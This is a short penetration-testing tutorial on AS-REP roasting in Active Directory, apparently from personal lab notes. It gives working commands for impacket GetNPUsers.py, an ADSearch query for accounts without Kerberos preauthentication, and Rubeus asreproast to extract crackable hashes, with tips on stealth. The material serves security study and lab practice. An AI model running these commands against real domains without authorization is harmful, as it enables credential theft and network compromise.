# Active Directory Attacks

## AS-REP Roasting

This attack is possible due to Kerberos PRE-AUTH is disabled on the specific domain account.

### Attack Simulation

To simulate this attack, we will be using user Sam Walker, go to your DC and Sam Walker's user property.

Under the Account tab, tick the "**Do not require Kerberos preauthentication**" options and apply the changes.

<figure><img src="http://192.168.1.119/uploads/images/gallery/2024-01/scaled-1680-/TbRUojmPWFY0NjFn-image.png" alt=""><figcaption></figcaption></figure>

### Running Attack

#### **On linux:**

```bash
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.local/ -usersfile users -format john -dc-ip 10.10.10.161
```

***

#### **On windows:**

{% hint style="info" %}
If the steps below doesn't work, try running them again with a NT AUTHORITY\SYSTEM privilege shell.
{% endhint %}

For a stealthier attack, we will first try to find account with the preauthentication option checked. [ADSearch](https://github.com/Flangvik/SharpCollection) is a great tool for this.

```shell
ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
```

<figure><img src="http://192.168.1.119/uploads/images/gallery/2024-01/scaled-1680-/UJDsFhnR7dzLtXD8-image.png" alt=""><figcaption></figcaption></figure>

_userAccountControl:1.2.840.113556.1.4.803:=4194304_ <= **4194304** is the decimal value for **DONT\_REQ\_PREAUTH**

For more information about the userAccountControl attribute, refer to [https://eddiejackson.net/wp/?p=16387](https://eddiejackson.net/wp/?p=16387)

Now that we get which user has the attribute checked, we can do the roasting with [Rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries).

```shell
Rubeus.exe asreproast /user:swalker /nowrap
```

<figure><img src="http://192.168.1.119/uploads/images/gallery/2024-01/scaled-1680-/qCTEt0QtIejVF6xW-image.png" alt=""><figcaption></figcaption></figure>

You can now crack the hash using hashcat or john.

If you don't care about the noises generated while running the attack, you can also just do AS-REP roasting with Rubeus without specifying a user. It will attempt to roast all users and will return the result for any successfully retrieved hash.<br>
